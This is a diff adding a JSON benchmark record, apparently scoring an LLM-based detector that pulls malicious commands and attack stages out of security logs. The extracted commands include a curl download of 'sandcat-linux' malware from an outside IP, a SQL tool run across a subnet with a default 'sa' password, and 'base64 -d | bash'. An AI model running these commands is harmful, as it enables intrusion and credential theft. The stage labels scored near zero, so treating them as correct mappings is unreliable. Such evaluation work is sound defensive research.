@@ -1,0 +1,76 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "curl -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version...",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Execution"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sshd -D -R",
+        "stage": "Command and Control/Persistence"
+      },
+      {
+        "command": "base64 -d | bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "/usr/bin/wget --version > /dev/null; ... metadata instance APIs",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "Attack using a combination of techniques: downloading and executing botnet malware (sandcat), exploiting SQL servers for credential harvesting and lateral movement, establishing persistent reverse SSH tunnels, and evading defenses through modified MOTD scripts.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 52209,
+      "completion_tokens": 4010,
+      "total_tokens": 56219,
+      "wall_clock_s": 55.261,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.16666666666666666,
+      "recall": 0.14285714285714285,
+      "f1": 0.15384615384615383,
+      "tp": 1,
+      "fp": 5,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 6,
+      "fn": 7,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 52209,
+      "completion_tokens": 4010,
+      "total_tokens": 56219,
+      "wall_clock_s": 55.261,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
